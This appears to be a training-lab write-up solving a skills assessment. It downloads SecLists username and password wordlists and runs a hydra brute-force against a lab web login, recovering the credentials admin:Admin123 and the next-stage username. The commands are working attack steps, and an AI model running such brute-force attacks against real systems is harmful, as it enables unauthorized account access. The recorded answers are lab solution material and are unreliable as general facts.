The first part of the skills assessment will require you to brute-force the the target instance. Successfully finding the correct login will provide you with the username you will need to start Skills Assessment Part 2.

You might find the following wordlists helpful in this engagement: [usernames.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt) and [passwords.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt)

![Pasted image 20250213155858.png](../../../../IMAGES/Pasted%20image%2020250213155858.png)

Let's begin by downloading both wordlists to our machine:

```
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt 
```

```
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
```

Once we've got everything, let's begin with the bruteforce process, we can use hydra for this process:

```
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 94.237.54.164 -s 42572 http-get -t 60
```

We get the following:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-13 21:02:48
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 60 tasks per 1 server, overall 60 tasks, 3400 login tries (l:17/p:200), ~57 tries per task
[DATA] attacking http-get://94.237.54.164:42572/
[42572][http-get] host: 94.237.54.164 login: admin password: Admin123
1 of 1 target successfully completed, 1 valid password found
```

Found credentials:

```
`admin`:`Admin123`
```

Let's log in now:

![Pasted image 20250213160445.png](../../../../IMAGES/Pasted%20image%2020250213160445.png)

We got the username:

```
satwossh
```
